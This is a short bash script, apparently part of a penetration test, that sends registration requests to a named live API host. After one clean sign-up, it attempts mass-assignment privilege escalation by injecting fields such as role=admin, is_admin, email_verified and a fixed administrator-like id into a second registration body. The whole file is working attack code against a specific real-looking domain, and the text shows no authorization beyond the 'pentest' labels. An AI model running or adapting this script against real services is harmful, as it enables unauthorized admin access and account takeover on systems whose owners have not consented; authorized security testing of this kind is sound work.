#!/usr/bin/env bash
A="https://api.breezy.philippeluu.fr"
OUT=/tmp/riveta
mkdir -p "$OUT"

reg() { # email pass user extrajson -> writes token files
  local email="$1" pass="$2" user="$3" extra="$4"
  local body="{\"email\":\"$email\",\"password\":\"$pass\",\"username\":\"$user\"$extra}"
  curl -sS -m 12 -X POST "$A/auth/register" -H "Content-Type: application/json" -d "$body"
}

echo "===== Register B (clean) ====="
reg "riveta-pentest-b@example.com" "Riveta-Pentest-1!" "rivetaPentestB" "" | tee "$OUT/regB.json"
echo

echo "===== Mass-assignment test: register C with role=admin, is_active, id, email_verified injected ====="
reg "riveta-pentest-c@example.com" "Riveta-Pentest-1!" "rivetaPentestC" ",\"role\":\"admin\",\"is_active\":true,\"id\":\"00000000-0000-0000-0000-000000000001\",\"email_verified\":true,\"is_admin\":true" | tee "$OUT/regC.json"
echo
